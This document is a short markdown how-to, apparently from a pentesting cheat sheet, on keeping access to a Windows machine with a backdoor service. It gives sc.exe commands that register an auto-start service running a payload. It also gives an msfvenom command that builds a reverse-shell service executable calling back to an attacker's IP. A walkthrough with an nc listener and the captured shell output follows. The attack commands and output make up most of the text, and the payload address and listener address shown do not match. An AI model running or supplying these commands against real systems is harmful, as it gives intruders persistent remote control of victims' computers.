# Creating Backdoor Services

use:
```cmd
C:\> sc.exe create <ur-service> binPath= "your payload path.exe" start= auto
```

then start it 
```cmd
C:\> sc.exe start <ur-service-name>
```

>**Note:** There must be a space after each equal sign for the command to work

create an executable that is compatible ith Windows service, you can use the exe-service format in msfvenom
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<UR-IP> LPORT=1337 -f exe-service -o rev-svc.exe
```

## Real Case

Lets assume I'm in Administrator account and want to establishing persistence

so im gonna make an exe-service payload in msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.128.121 LPORT=1337 -f exe-service -o rev-svc.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
```

then transfer the payload to the victim
> you can use any other transfer method

let assume the payload is in `C:\Windows` 
i create a service i,e **RevSVC**

```cmd
C:\Windows> sc.exe create RevSVC binPath= "C:\Windows\rev-svc.exe" start= auto
```

Before i start the service, start an `nc` listener first to receive the reverse shell

```bash
$ nc -lvp 1337
```

then i start the service in Administrator machine

```cmd
C:\Windows> sc.exe start RevSVC
```
and i receive the reverse shell

```bash
listening on [any] 1337 ...
connect to [192.168.100.101] from (UNKNOWN) [10.49.14.29] 50078
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
